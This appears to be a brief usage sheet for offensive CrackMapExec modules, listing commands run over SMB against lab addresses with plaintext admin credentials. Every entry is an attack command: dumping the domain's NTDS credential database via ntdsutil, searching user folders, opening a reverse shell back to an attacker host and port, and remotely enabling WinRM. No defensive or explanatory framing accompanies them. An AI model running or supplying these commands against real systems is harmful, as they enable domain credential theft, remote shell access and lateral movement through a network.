## Usage of ntdsutil

````console
crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M ntdsutil
````

## Usage of file_discovery

````console
crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M file_discovery -o SEARCH_PATH=C:\\Users
````

## Usage of revshell

````console
crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M reverse_shell -o LHOST=192.168.163.136 LPORT=1234 HTTP_SERVER=8443
````

## Usage of winrm

````console
crackmapexec smb 192.168.163.142 -u Admin2 -p 'Password123!' -M winrm -o ACTION=ENABLE
crackmapexec smb 192.168.163.142 -u Admin2 -p 'Password123!' -M winrm -o ACTION=DISABLE
````
